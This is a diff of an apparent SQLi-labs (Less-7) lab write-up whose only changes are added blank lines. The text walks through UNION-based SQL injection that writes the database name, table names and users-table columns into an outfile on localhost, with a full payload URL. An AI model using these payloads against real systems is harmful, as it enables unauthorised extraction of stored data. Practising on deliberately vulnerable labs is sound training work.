@@ -25,6 +25,8 @@ The output will be now directed to the outfile and printed in it like so
 |1|Dumb|Dumb|
 | - | - | - |
 |1|2|3|
+
+
 ![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.004.jpeg)
 
 We can do the same sql injection functions but the only difference is that the outcome or output will be now redirected and printed into a outfile.
@@ -36,6 +38,8 @@ Now we will continue by checking the database that the data is present in. **PAY
 |1|Dumb|Dumb|
 | - | - | - |
 |security|2|3|
+
+
 ![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.005.jpeg)
 
 We will now concat the table names of the database to the outfile using the following payload
@@ -49,6 +53,8 @@ We will now concat the table names of the database to the outfile using the foll
 |1|Dumb|Dumb|
 | - | - | - |
 |emails,referers,uagents,users|2|3|
+
+
 ![](Aspose.Words.bc575bc4-1aae-4150-a934-1fb6223acf00.006.jpeg)
 
 We will now find the columns that are present in the table users using the following payload **PAYLOAD:** ”<http://localhost/sqli/Less-7/?id=1%27>))%20union%20all%20select%20group\_concat(column\_n ame),2,3%20from%20information\_schema.columns%20where%20table\_name=%22users%22 %20into%20outfile%20%22dump.txt/home/rahulkrishnan/Desktop%22--+”
